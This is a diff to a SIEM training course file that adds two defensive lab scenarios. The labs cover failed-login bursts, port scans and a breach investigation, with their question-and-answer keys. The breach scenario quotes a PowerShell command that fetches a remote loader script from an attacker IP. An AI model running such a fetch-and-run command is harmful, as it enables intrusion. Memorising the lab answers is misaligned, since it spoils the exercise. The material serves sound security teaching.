@@ -15080,13 +15080,19 @@ index=windows EventCode=4625
       "Timeline reconstruction helps understand attack sequences"
     ],
     practicalExercise: {
-      title: "Independent Practice",
-      description: "Apply what you've learned to your own SIEM environment.",
+      title: "Basic Search Lab Triage",
+      description: "Use SPL queries to triage suspicious activity from the lab indexes.",
       steps: [
-        "Find all authentication failures in the last 24 hours",
-        "Identify the top 10 source IPs for denied firewall connections",
-        "Create a timeline for a specific user's activity",
-        "Find all PowerShell execution events on servers"
+        "Read the scenario carefully",
+        "Map each question to the right index and field",
+        "Pull answers directly from the scenario details"
+      ],
+      labScenario: "It's 09:00 UTC. In your SIEM you have three indexes: windows, network, and web. Overnight, host WKS007 (10.0.1.7) generated 142 EventCode=4625 failed logins targeting user 'admin'. The firewall (index=network) shows 318 denied connections from external IP 203.0.113.45 to dst_port=3389. The web server WEB01 (index=web) recorded 84 status=404 hits from clientip 198.51.100.22 hitting URIs like /admin, /login.php, and /wp-admin. You need to confirm each finding using the correct query.",
+      labQuestions: [
+        { id: "siem-3.4-q1", question: "Which EventCode and index identify the failed logins on WKS007?", answer: "EventCode=4625 in index=windows", hint: "Failed logon attempts in Windows Security logs." },
+        { id: "siem-3.4-q2", question: "How many denied connections came from 203.0.113.45 and to which port?", answer: "318 denied connections to dst_port=3389", hint: "Check the firewall denied counts in the scenario." },
+        { id: "siem-3.4-q3", question: "Which clientip is scanning WEB01 with 404 errors?", answer: "198.51.100.22", hint: "Look at the web index 404 details." },
+        { id: "siem-3.4-q4", question: "Which targeted user account on WKS007 should be flagged?", answer: "admin", hint: "Re-read the failed login detail." }
       ]
     }
   },
@@ -18908,14 +18914,19 @@ Congratulations on completing the SIEM Fundamentals course! 🎉
       "Immediate containment is critical to limit damage"
     ],
     practicalExercise: {
-      title: "Complete Investigation Challenge",
-      description: "Work through the entire investigation scenario using your SIEM skills.",
+      title: "Final Breach Investigation",
+      description: "Investigate the overnight intrusion and pull the key facts from the SIEM data.",
       steps: [
-        "Review the dismissed alerts and identify the pattern",
-        "Build a complete timeline of the attack",
-        "Extract all IOCs for blocking",
-        "Document scope and affected assets",
-        "Write a professional incident report"
+        "Review the dismissed alerts from 02:00-04:00 UTC",
+        "Identify the attacker IP and entry technique",
+        "Map findings to MITRE ATT&CK and answer the lab questions"
+      ],
+      labScenario: "It's 08:00 UTC on October 15, 2024. Overnight, three SIEM alerts between 02:14 and 03:47 UTC were closed as 'false_positive' under the assumption a pentest was running — but the pentest was postponed. Your queries reveal: 412 EventCode=4625 failed logins from external IP 45.77.12.99 against user 'svc_backup' on the VPN, followed by one EventCode=4624 success at 02:51 UTC (LogonType=10). At 03:05 UTC, host SRV-FIN-02 ran a PowerShell command 'Invoke-WebRequest http://45.77.12.99/loader.ps1'. At 03:42 UTC, the firewall logged 1.8 GB outbound from SRV-FIN-02 to 45.77.12.99 over port 443.",
+      labQuestions: [
+        { id: "siem-7.4-q1", question: "What is the attacker's source IP?", answer: "45.77.12.99", hint: "The same IP appears in failed logins, PowerShell, and exfil." },
+        { id: "siem-7.4-q2", question: "Which account was successfully compromised and at what time?", answer: "svc_backup at 02:51 UTC", hint: "The first 4624 success after the 4625 burst." },
+        { id: "siem-7.4-q3", question: "Which host was used for execution and exfiltration?", answer: "SRV-FIN-02", hint: "Same host runs PowerShell and sends the outbound traffic." },
+        { id: "siem-7.4-q4", question: "How much data was exfiltrated and over what port?", answer: "1.8 GB over port 443", hint: "Check the firewall outbound entry at 03:42 UTC." }
       ]
     }
   },
